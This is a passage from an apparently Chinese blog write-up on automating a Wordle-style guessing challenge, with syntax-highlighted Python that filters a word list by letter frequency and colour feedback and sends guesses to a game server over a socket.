class="attribute">pass</span></span><br><span class="line">                    <span class="attribute">if</span> len(data_<span class="number">05</span>) == <span class="number">0</span>:</span><br><span class="line">                        <span class="attribute">return</span> data_<span class="number">04</span>[-<span class="number">1</span>]</span><br><span class="line">                    <span class="attribute">else</span>:</span><br><span class="line">                        <span class="attribute">return</span> data_<span class="number">05</span>[-<span class="number">1</span>]</span><br><span class="line">            <span class="attribute">else</span>:</span><br><span class="line">                <span class="attribute">data_04</span> =<span class="meta"> []</span></span><br><span class="line">                <span class="attribute">for</span> each_word in data_<span class="number">03</span>:</span><br><span class="line">                    <span class="attribute">if</span> each_word[int(Q[-<span class="number">4</span>][<span class="number">0</span>][<span class="number">1</span>]) - <span class="number">1</span>] == Q[-<span class="number">4</span>][<span class="number">0</span>][<span class="number">0</span>]:</span><br><span class="line">                        <span class="attribute">data_04</span>.append(each_word)</span><br><span class="line">                    <span class="attribute">else</span>:</span><br><span class="line">                        <span class="attribute">pass</span></span><br><span class="line">                <span class="attribute">if</span> len(data_<span class="number">04</span>) == <span class="number">0</span>:</span><br><span class="line">                    <span class="attribute">data_05</span> =<span class="meta"> []</span></span><br><span class="line">                    <span class="attribute">for</span> each_word in data_<span class="number">03</span>:</span><br><span class="line">                        <span class="attribute">if</span> each_word[int(Q[-<span class="number">5</span>][<span class="number">0</span>][<span class="number">1</span>]) - <span class="number">1</span>] == Q[-<span class="number">5</span>][<span class="number">0</span>][<span class="number">0</span>]:</span><br><span class="line">                            <span class="attribute">data_05</span>.append(each_word)</span><br><span class="line">                        <span class="attribute">else</span>:</span><br><span class="line">                            <span class="attribute">pass</span></span><br><span class="line">                    <span class="attribute">if</span> len(data_<span class="number">05</span>) == <span class="number">0</span>:</span><br><span class="line">                        <span class="attribute">return</span> data_<span class="number">03</span>[-<span class="number">1</span>]</span><br><span class="line">                    <span class="attribute">else</span>:</span><br><span class="line">                        <span class="attribute">return</span> data_<span class="number">05</span>[-<span class="number">1</span>]</span><br><span class="line">                <span class="attribute">else</span>:</span><br><span class="line">                    <span class="attribute">data_05</span> =<span class="meta"> []</span></span><br><span class="line">                    <span class="attribute">for</span> each_word in data_<span class="number">04</span>:</span><br><span class="line">                        <span class="attribute">if</span> each_word[int(Q[-<span class="number">5</span>][<span class="number">0</span>][<span class="number">1</span>]) - <span class="number">1</span>] == Q[-<span class="number">5</span>][<span class="number">0</span>][<span class="number">0</span>]:</span><br><span class="line">                            <span class="attribute">data_05</span>.append(each_word)</span><br><span class="line">                        <span class="attribute">else</span>:</span><br><span class="line">                            <span class="attribute">pass</span></span><br><span class="line">                    <span class="attribute">if</span> len(data_<span class="number">05</span>) == <span class="number">0</span>:</span><br><span class="line">                        <span class="attribute">return</span> data_<span class="number">04</span>[-<span class="number">1</span>]</span><br><span class="line">                    <span class="attribute">else</span>:</span><br><span class="line">                        <span class="attribute">return</span> data_<span class="number">05</span>[-<span class="number">1</span>]</span><br><span class="line">        <span class="attribute">else</span>:  # data<span class="number">2</span> != <span class="number">0</span></span><br><span class="line">            <span class="attribute">data_03</span> =<span class="meta"> []</span></span><br><span class="line">            <span class="attribute">for</span> each_word in data_<span class="number">02</span>:</span><br><span class="line">                <span class="attribute">if</span> each_word[int(Q[-<span class="number">3</span>][<span class="number">0</span>][<span class="number">1</span>]) - <span class="number">1</span>] == Q[-<span class="number">3</span>][<span class="number">0</span>][<span class="number">0</span>]:</span><br><span class="line">                    <span class="attribute">data_03</span>.append(each_word)</span><br><span class="line">                <span class="attribute">else</span>:</span><br><span class="line">                    <span class="attribute">pass</span></span><br><span class="line">            <span class="attribute">if</span> len(data_<span class="number">03</span>) == <span class="number">0</span>:</span><br><span class="line">                <span class="attribute">data_04</span> =<span class="meta"> []</span></span><br><span class="line">                <span class="attribute">for</span> each_word in data_<span class="number">02</span>:</span><br><span class="line">                    <span class="attribute">if</span> each_word[int(Q[-<span class="number">4</span>][<span class="number">0</span>][<span class="number">1</span>]) - <span class="number">1</span>] == Q[-<span class="number">4</span>][<span class="number">0</span>][<span class="number">0</span>]:</span><br><span class="line">                        <span class="attribute">data_04</span>.append(each_word)</span><br><span class="line">                    <span class="attribute">else</span>:</span><br><span class="line">                        <span class="attribute">pass</span></span><br><span class="line">                <span class="attribute">if</span> len(data_<span class="number">04</span>) == <span class="number">0</span>:</span><br><span class="line">                    <span class="attribute">data_05</span> =<span class="meta"> []</span></span><br><span class="line">                    <span class="attribute">for</span> each_word in data_<span class="number">02</span>:</span><br><span class="line">                        <span class="attribute">if</span> each_word[int(Q[-<span class="number">5</span>][<span class="number">0</span>][<span class="number">1</span>]) - <span class="number">1</span>] == Q[-<span class="number">5</span>][<span class="number">0</span>][<span class="number">0</span>]:</span><br><span class="line">                            <span class="attribute">data_05</span>.append(each_word)</span><br><span class="line">                        <span class="attribute">else</span>:</span><br><span class="line">                            <span class="attribute">pass</span></span><br><span class="line">                    <span class="attribute">if</span> len(data_<span class="number">05</span>) == <span class="number">0</span>:</span><br><span class="line">                        <span class="attribute">return</span> data_<span class="number">02</span>[-<span class="number">1</span>]</span><br><span class="line">                    <span class="attribute">else</span>:</span><br><span class="line">                        <span class="attribute">return</span> data_<span class="number">05</span>[-<span class="number">1</span>]</span><br><span class="line">                <span class="attribute">else</span>:</span><br><span class="line">                    <span class="attribute">data_05</span> =<span class="meta"> []</span></span><br><span class="line">                    <span class="attribute">for</span> each_word in data_<span class="number">04</span>:</span><br><span class="line">                        <span class="attribute">if</span> each_word[int(Q[-<span class="number">5</span>][<span class="number">0</span>][<span class="number">1</span>]) - <span class="number">1</span>] == Q[-<span class="number">5</span>][<span class="number">0</span>][<span class="number">0</span>]:</span><br><span class="line">                            <span class="attribute">data_05</span>.append(each_word)</span><br><span class="line">                        <span class="attribute">else</span>:</span><br><span class="line">                            <span class="attribute">pass</span></span><br><span class="line">                    <span class="attribute">if</span> len(data_<span class="number">05</span>) == <span class="number">0</span>:</span><br><span class="line">                        <span class="attribute">return</span> data_<span class="number">04</span>[-<span class="number">1</span>]</span><br><span class="line">                    <span class="attribute">else</span>:</span><br><span class="line">                        <span class="attribute">return</span> data_<span class="number">05</span>[-<span class="number">1</span>]</span><br><span class="line">            <span class="attribute">else</span>:  # data<span class="number">3</span> != <span class="number">0</span></span><br><span class="line">                <span class="attribute">data_04</span> =<span class="meta"> []</span></span><br><span class="line">                <span class="attribute">for</span> each_word in data_<span class="number">03</span>:</span><br><span class="line">                    <span class="attribute">if</span> each_word[int(Q[-<span class="number">4</span>][<span class="number">0</span>][<span class="number">1</span>]) - <span class="number">1</span>] == Q[-<span class="number">4</span>][<span class="number">0</span>][<span class="number">0</span>]:</span><br><span class="line">                        <span class="attribute">data_04</span>.append(each_word)</span><br><span class="line">                    <span class="attribute">else</span>:</span><br><span class="line">                        <span class="attribute">pass</span></span><br><span class="line">                <span class="attribute">if</span> len(data_<span class="number">04</span>) == <span class="number">0</span>:</span><br><span class="line">                    <span class="attribute">data_05</span> =<span class="meta"> []</span></span><br><span class="line">                    <span class="attribute">for</span> each_word in data_<span class="number">03</span>:</span><br><span class="line">                        <span class="attribute">if</span> each_word[int(Q[-<span class="number">5</span>][<span class="number">0</span>][<span class="number">1</span>]) - <span class="number">1</span>] == Q[-<span class="number">5</span>][<span class="number">0</span>][<span class="number">0</span>]:</span><br><span class="line">                            <span class="attribute">data_05</span>.append(each_word)</span><br><span class="line">                        <span class="attribute">else</span>:</span><br><span class="line">                            <span class="attribute">pass</span></span><br><span class="line">                    <span class="attribute">if</span> len(data_<span class="number">05</span>) == <span class="number">0</span>:</span><br><span class="line">                        <span class="attribute">return</span> data_<span class="number">03</span>[-<span class="number">1</span>]</span><br><span class="line">                    <span class="attribute">else</span>:</span><br><span class="line">                        <span class="attribute">return</span> data_<span class="number">05</span>[-<span class="number">1</span>]</span><br><span class="line">                <span class="attribute">else</span>:  # data<span class="number">4</span> != <span class="number">0</span></span><br><span class="line">                    <span class="attribute">data_05</span> =<span class="meta"> []</span></span><br><span class="line">                    <span class="attribute">for</span> each_word in data_<span class="number">04</span>:</span><br><span class="line">                        <span class="attribute">if</span> each_word[int(Q[-<span class="number">5</span>][<span class="number">0</span>][<span class="number">1</span>]) - <span class="number">1</span>] == Q[-<span class="number">5</span>][<span class="number">0</span>][<span class="number">0</span>]:</span><br><span class="line">                            <span class="attribute">data_05</span>.append(each_word)</span><br><span class="line">                        <span class="attribute">else</span>:</span><br><span class="line">                            <span class="attribute">pass</span></span><br><span class="line">                    <span class="attribute">if</span> len(data_<span class="number">05</span>) == <span class="number">0</span>:</span><br><span class="line">                        <span class="attribute">return</span> data_<span class="number">04</span>[-<span class="number">1</span>]</span><br><span class="line">                    <span class="attribute">else</span>:</span><br><span class="line">                        <span class="attribute">return</span> data_<span class="number">05</span>[-<span class="number">1</span>]</span><br><span class="line">                    </span><br><span class="line">                    </span><br><span class="line">                    </span><br><span class="line">                    </span><br><span class="line">        </span><br><span class="line">                </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="attribute">HOST</span> = &#x27;<span class="number">47.106.102.129</span>&#x27;</span><br><span class="line"><span class="attribute">PORT</span> = <span class="number">26389</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">s</span> = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line"><span class="attribute">s</span>.connect((HOST, PORT))</span><br><span class="line"><span class="attribute">print</span>(s.recv(<span class="number">1024</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 选择模式</span></span><br><span class="line"><span class="attribute">s</span>.send(&#x27;<span class="number">1</span>\n&#x27;.encode())</span><br><span class="line"><span class="attribute">s_</span> = str(s.recv(<span class="number">1024</span>))</span><br><span class="line"><span class="attribute">print</span>(s_)</span><br><span class="line"><span class="attribute">for</span> each in range(<span class="number">515</span>):</span><br><span class="line">    <span class="attribute">state</span> = <span class="number">0</span></span><br><span class="line">    <span class="comment"># 初始化数据</span></span><br><span class="line">    <span class="attribute">data</span> = open(&#x27;/Users/wenhui/Downloads/daf<span class="number">733</span>a<span class="number">35279428</span>eac<span class="number">1</span>b<span class="number">7</span>fcc<span class="number">43328</span>fe<span class="number">8</span>/valid_words.txt&#x27;, &#x27;r&#x27;)</span><br><span class="line">    <span class="attribute">data</span> = data.read().split(&#x27;\n&#x27;)</span><br><span class="line">    <span class="attribute">while</span> state == <span class="number">0</span>:</span><br><span class="line">        <span class="comment"># 获取推荐并发送</span></span><br><span class="line">        <span class="attribute">GET</span> = get()</span><br><span class="line">        <span class="attribute">if</span> GET:</span><br><span class="line">            <span class="attribute">print</span>(GET)</span><br><span class="line">            <span class="attribute">tmp</span> = GET</span><br><span class="line">        <span class="attribute">else</span>:</span><br><span class="line">            <span class="attribute">tmp</span> = data[-<span class="number">1</span>]</span><br><span class="line">            <span class="attribute">print</span>(<span class="string">&quot;get居然失效了！&quot;</span>)</span><br><span class="line">            <span class="attribute">print</span>(data)</span><br><span class="line">        <span class="attribute">s</span>.send(&#x27;&#123;<span class="number">0</span>&#125;\n&#x27;.format(tmp).encode())</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 接受反馈</span></span><br><span class="line">        <span class="attribute">s_</span> = str(s.recv(<span class="number">1024</span>))</span><br><span class="line">        <span class="attribute">print</span>(s_)</span><br><span class="line"></span><br><span class="line">        <span class="attribute">if</span> &#x27;Correct!&#x27; in s_:</span><br><span class="line">            <span class="attribute">state</span> = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 针对错误过程</span></span><br><span class="line">        <span class="attribute">s_</span> = &#x27;&#x27;.join(s_.split(<span class="string">&quot;b&#x27;Wrong!   &quot;</span>))</span><br><span class="line">        <span class="attribute">s_</span> = s_.split(r&#x27;  \x<span class="number">1</span>b[<span class="number">0</span>m&#x27;)</span><br><span class="line">        <span class="attribute">s_</span>.pop()</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 人类的一小步</span></span><br><span class="line">        <span class="attribute">site</span> = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">        <span class="attribute">for</span> color in s_:</span><br><span class="line">            <span class="attribute">if</span> &#x27;<span class="number">47</span>m&#x27; in color:  # 白色 : 在这个位置，这个字母不存在！</span><br><span class="line">                <span class="comment"># tmp = saves</span></span><br><span class="line">                <span class="comment"># 不在这个位置</span></span><br><span class="line">                <span class="attribute">del_word</span> = tmp[site - <span class="number">1</span>]  # <span class="string">&quot;s&quot;</span></span><br><span class="line">                <span class="attribute">data2</span> =<span class="meta"> []</span></span><br><span class="line">                <span class="attribute">for</span> word in data:</span><br><span class="line">                    <span class="attribute">if</span> word[site - <span class="number">1</span>] != del_word:</span><br><span class="line">                        <span class="attribute">data2</span>.append(word)</span><br><span class="line">                <span class="attribute">data</span> = data<span class="number">2</span></span><br><span class="line">                <span class="attribute">print</span>(<span class="string">&quot;白色&quot;</span>, len(data))</span><br><span class="line"></span><br><span class="line">            <span class="attribute">elif</span> &#x27;<span class="number">43</span>m&#x27; in color:  # 黄色 : 字母存在，但不是这个位置</span><br><span class="line">                <span class="comment"># 存在</span></span><br><span class="line">                <span class="attribute">data1</span> = data</span><br><span class="line">                <span class="attribute">data</span> =<span class="meta"> []</span></span><br><span class="line">                <span class="attribute">for</span> i in data<span class="number">1</span>:</span><br><span class="line">                    <span class="attribute">if</span> tmp[site - <span class="number">1</span>] in i:</span><br><span class="line">                        <span class="attribute">data</span>.append(i)</span><br><span class="line"></span><br><span class="line">                <span class="comment"># 不在这个位置</span></span><br><span class="line">                <span class="attribute">del_word</span> = tmp[site - <span class="number">1</span>]  # <span class="string">&quot;s&quot;</span></span><br><span class="line">                <span class="attribute">data2</span> =<span class="meta"> []</span></span><br><span class="line">                <span class="attribute">for</span> word in data:</span><br><span class="line">                    <span class="attribute">if</span> word[site - <span class="number">1</span>] != del_word:</span><br><span class="line">                        <span class="attribute">data2</span>.append(word)</span><br><span class="line">                <span class="attribute">data</span> = data<span class="number">2</span></span><br><span class="line">                <span class="attribute">print</span>(<span class="string">&quot;黄色&quot;</span>, len(data))</span><br><span class="line"></span><br><span class="line">            <span class="attribute">elif</span> &#x27;<span class="number">42</span>m&#x27; in color:  # 绿色 : 字母存在 且 是在这个位置</span><br><span class="line">                <span class="comment"># 存在且位置正确</span></span><br><span class="line">                <span class="attribute">word</span> = tmp[site - <span class="number">1</span>]  # d</span><br><span class="line">                <span class="attribute">data2</span> =<span class="meta"> []</span></span><br><span class="line">                <span class="attribute">for</span> i in data:</span><br><span class="line">                    <span class="attribute">if</span> i[int(site) - <span class="number">1</span>] == word:</span><br><span class="line">                        <span class="attribute">data2</span>.append(i)</span><br><span class="line">                <span class="attribute">data</span> = data<span class="number">2</span></span><br><span class="line">                <span class="attribute">print</span>(<span class="string">&quot;绿色&quot;</span>, len(data))</span><br><span class="line">            <span class="attribute">else</span>:</span><br><span class="line">                <span class="attribute">print</span>(&#x27;啥也不是&#x27;, color)</span><br><span class="line">            <span class="attribute">site</span> += <span class="number">1</span></span><br></pre></td></tr></table></figure><p>结局是，还是过不去模式1</p><h3 id="元音选择"><a href="#元音选择" class="headerlink" title="元音选择"></a>元音选择</h3><p>想到，对“在<strong>valid_words.txt</strong>中尝试找到一个尽可能包含以上五个字母的单词”的实现中，往往是获得一个列表，其中的单词还可以在进一步筛选</p><ul><li>盲猜答案单词相对常见不生僻</li><li>统计列表中每一个单词含有的元音字母、排序、选择含元音最多的</li></ul><p>期间还重写了 get() 函数（即：实现统计并推荐单词的函数。很粗暴的条件判定罗列，当时没心思想是否有更巧妙的编程方法</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">import</span> socket</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 求出现总次数、排序</span></span><br><span class="line"><span class="attribute">def</span> sum_l(site):</span><br><span class="line">    <span class="attribute">global</span> data</span><br><span class="line">    <span class="attribute">dict_letter</span> = &#123;&#125;</span><br><span class="line">    <span class="attribute">for</span> word in data:</span><br><span class="line">        <span class="attribute">if</span> word[site - <span class="number">1</span>] in dict_letter:</span><br><span class="line">            <span class="attribute">dict_letter</span>[word[site - <span class="number">1</span>]] += <span class="number">1</span></span><br><span class="line">        <span class="attribute">else</span>:</span><br><span class="line">            <span class="attribute">dict_letter</span>[word[site - <span class="number">1</span>]] = <span class="number">1</span></span><br><span class="line">    <span class="attribute">dict_letter</span>.items()  # 得到: dict_items([(&#x27;a&#x27;, <span class="number">1</span>), (&#x27;c&#x27;, <span class="number">3</span>), (&#x27;b&#x27;, <span class="number">2</span>)])</span><br><span class="line">    <span class="attribute">L</span> = list(dict_letter.items())  # 得到列表: L=[(&#x27;a&#x27;, <span class="number">1</span>), (&#x27;c&#x27;, <span class="number">3</span>), (&#x27;b&#x27;, <span class="number">2</span>)]</span><br><span class="line">    <span class="attribute">L</span>.sort(key=lambda x: x[<span class="number">1</span>], reverse=False)  # 按列表中，每一个元组的第二个元素从小到大排序。</span><br><span class="line">    <span class="attribute">return</span> L</span><br><span class="line">    <span class="comment"># x代表从L中遍历出的一个元组</span></span><br><span class="line">    <span class="comment"># 得到:  [(&#x27;a&#x27;, 1), (&#x27;b&#x27;, 2), (&#x27;c&#x27;, 3)]</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 统计推荐</span></span><br><span class="line"><span class="attribute">def</span> get():</span><br><span class="line">    <span class="attribute">if</span> len(data) == <span class="number">1</span>:</span><br><span class="line">        <span class="attribute">return</span> data</span><br><span class="line">    <span class="attribute">L1</span> = sum_l(<span class="number">1</span>)</span><br><span class="line">    <span class="attribute">L2</span> = sum_l(<span class="number">2</span>)</span><br><span class="line">    <span class="attribute">L3</span> = sum_l(<span class="number">3</span>)</span><br><span class="line">    <span class="attribute">L4</span> = sum_l(<span class="number">4</span>)</span><br><span class="line">    <span class="attribute">L5</span> = sum_l(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">    <span class="attribute">L_list</span> =<span class="meta"> [L1, L2, L3, L4, L5]</span></span><br><span class="line">    <span class="attribute">quanzhong</span> = &#123;&#125;</span><br><span class="line">    <span class="attribute">site1</span> = <span class="number">1</span></span><br><span class="line">    <span class="attribute">for</span> L in L_list:</span><br><span class="line">        <span class="attribute">if</span> len(L) == <span class="number">1</span>:  # 此位已确定，不予排序</span><br><span class="line">            <span class="attribute">pass</span></span><br><span class="line">        <span class="attribute">else</span>:</span><br><span class="line">            <span class="attribute">quanzhong</span>[L[-<span class="number">1</span>][<span class="number">0</span>] + str(site<span class="number">1</span>)] = L[-<span class="number">1</span>][-<span class="number">1</span>]  # 把每一位最大权重的字母加到列表中like： &#123;<span class="string">&quot;c1&quot;</span>: <span class="number">3</span>&#125; ；  <span class="string">&quot;1&quot;</span> 指代第一位</span><br><span class="line">        <span class="attribute">site1</span> += <span class="number">1</span></span><br><span class="line">    <span class="attribute">Q</span> = list(quanzhong.items())</span><br><span class="line">    <span class="attribute">Q</span>.sort(key=lambda x: x[<span class="number">1</span>], reverse=False)  # 按列表中，每一个元组的第二个元素从小到大排序。</span><br><span class="line">    <span class="attribute">print</span>(<span class="string">&quot;Q&quot;</span>, Q)</span><br><span class="line">    <span class="comment"># 得到列表: Q=[(&#x27;a2&#x27;, 1), (&#x27;c3&#x27;, 4), (&#x27;b1&#x27;, 4)]</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 位权最高</span></span><br><span class="line">    <span class="attribute">data_01</span> =<span class="meta"> []</span></span><br><span class="line">    <span class="attribute">for</span> each_word in data:</span><br><span class="line">        <span class="attribute">if</span> each_word[int(Q[-<span class="number">1</span>][<span class="number">0</span>][<span class="number">1</span>]) - <span class="number">1</span>] == Q[-<span class="number">1</span>][<span class="number">0</span>][<span class="number">0</span>]:</span><br><span class="line">            <span class="attribute">data_01</span>.append(each_word)</span><br><span class="line">    <span class="attribute">print</span>(data_<span class="number">01</span>)</span><br><span class="line">    <span class="attribute">if</span> len(Q) == <span class="number">1</span>:</span><br><span class="line">        <span class="comment"># [(&#x27;b1&#x27;, 4)]</span></span><br><span class="line">        <span class="attribute">return</span> data_<span class="number">01</span></span><br><span class="line">    <span class="attribute">elif</span> len(Q) == <span class="number">2</span>:</span><br><span class="line">        <span class="comment"># [(&#x27;c3&#x27;, 4), (&#x27;b1&#x27;, 4)]]</span></span><br><span class="line">        <span class="attribute">data_02</span> =<span class="meta"> []</span></span><br><span class="line">        <span class="attribute">for</span> each_word in data_<span class="number">01</span>:</span><br><span class="line">            <span class="attribute">if</span> each_word[int(Q[-<span class="number">2</span>][<span class="number">0</span>][<span class="number">1</span>]) - <span class="number">1</span>] == Q[-<span class="number">2</span>][<span class="number">0</span>][<span 